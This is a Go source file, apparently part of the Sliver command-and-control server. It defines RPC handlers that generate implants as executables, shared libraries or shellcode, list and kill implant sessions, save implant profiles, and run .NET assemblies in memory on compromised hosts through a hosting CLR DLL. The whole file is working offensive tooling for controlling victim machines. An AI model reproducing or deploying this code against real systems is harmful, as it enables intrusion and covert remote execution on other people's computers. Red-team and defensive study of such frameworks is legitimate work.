package rpc

import (
	"errors"
	"io/ioutil"
	"path"
	clientpb "sliver/protobuf/client"
	sliverpb "sliver/protobuf/sliver"
	"sliver/server/assets"
	"sliver/server/core"
	"sliver/server/generate"
	"time"

	"github.com/golang/protobuf/proto"
)

func rpcKill(data []byte, resp RPCResponse) {
	killReq := &sliverpb.KillReq{}
	err := proto.Unmarshal(data, killReq)
	if err != nil {
		resp([]byte{}, err)
	}
	sliver := core.Hive.Sliver(killReq.SliverID)
	data, err = sliver.Request(sliverpb.MsgKill, defaultTimeout, data)
	core.Hive.RemoveSliver(sliver)
	println(core.Hive.Slivers)
	resp(data, err)
}

func rpcSessions(_ []byte, resp RPCResponse) {
	sessions := &clientpb.Sessions{}
	if 0 < len(*core.Hive.Slivers) {
		for _, sliver := range *core.Hive.Slivers {
			sessions.Slivers = append(sessions.Slivers, sliver.ToProtobuf())
		}
	}
	data, err := proto.Marshal(sessions)
	if err != nil {
		rpcLog.Errorf("Error encoding rpc response %v", err)
	}
	resp(data, err)
}

func rpcGenerate(req []byte, resp RPCResponse) {
	var fpath string
	genReq := &clientpb.GenerateReq{}
	err := proto.Unmarshal(req, genReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	config := generate.SliverConfigFromProtobuf(genReq.Config)
	if config == nil {
		err := errors.New("Invalid Sliver config")
		resp([]byte{}, err)
		return
	}
	switch genReq.Config.Format {
	case clientpb.SliverConfig_EXECUTABLE:
		fpath, err = generate.SliverExecutable(config)
	case clientpb.SliverConfig_SHARED_LIB:
		fpath, err = generate.SliverSharedLibrary(config)
	case clientpb.SliverConfig_SHELLCODE:
		fpath, err = generate.SliverSharedLibrary(config)
		if err != nil {
			resp([]byte{}, err)
			return
		}
		fpath, err = generate.ShellcodeRDIToFile(fpath, "RunSliver")
		if err != nil {
			resp([]byte{}, err)
			return
		}
	}
	filename := path.Base(fpath)
	filedata, err := ioutil.ReadFile(fpath)
	generated := &clientpb.Generate{
		File: &clientpb.File{
			Name: filename,
			Data: filedata,
		},
	}
	data, err := proto.Marshal(generated)
	resp(data, err)
}

func rpcProfiles(_ []byte, resp RPCResponse) {
	profiles := &clientpb.Profiles{List: []*clientpb.Profile{}}
	for name, config := range generate.GetProfiles() {
		profiles.List = append(profiles.List, &clientpb.Profile{
			Name:   name,
			Config: config.ToProtobuf(),
		})
	}
	data, err := proto.Marshal(profiles)
	resp(data, err)
}

func rpcNewProfile(req []byte, resp RPCResponse) {
	profile := &clientpb.Profile{}
	err := proto.Unmarshal(req, profile)
	if err != nil {
		rpcLog.Errorf("Failed to decode message %v", err)
		resp([]byte{}, err)
	}
	config := generate.SliverConfigFromProtobuf(profile.Config)
	profile.Name = path.Base(profile.Name)
	if 0 < len(profile.Name) && profile.Name != "." {
		rpcLog.Infof("Saving new profile with name %#v", profile.Name)
		err = generate.SaveProfile(profile.Name, config)
	} else {
		err = errors.New("Invalid profile name")
	}
	resp([]byte{}, err)
}

func rpcExecuteAssembly(req []byte, resp RPCResponse) {
	execReq := &sliverpb.ExecuteAssemblyReq{}
	err := proto.Unmarshal(req, execReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	sliver := core.Hive.Sliver(execReq.SliverID)
	if sliver == nil {
		resp([]byte{}, err)
		return
	}
	hostingDllPath := assets.GetDataDir() + "/HostingCLRx64.dll"
	hostingDllBytes, err := ioutil.ReadFile(hostingDllPath)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&sliverpb.ExecuteAssemblyReq{
		Assembly:   execReq.Assembly,
		HostingDll: hostingDllBytes,
		Arguments:  execReq.Arguments,
		Timeout:    execReq.Timeout,
		SliverID:   execReq.SliverID,
	})
	timeout := time.Duration(execReq.Timeout) * time.Second
	data, err = sliver.Request(sliverpb.MsgExecuteAssemblyReq, timeout, data)
	resp(data, err)

}
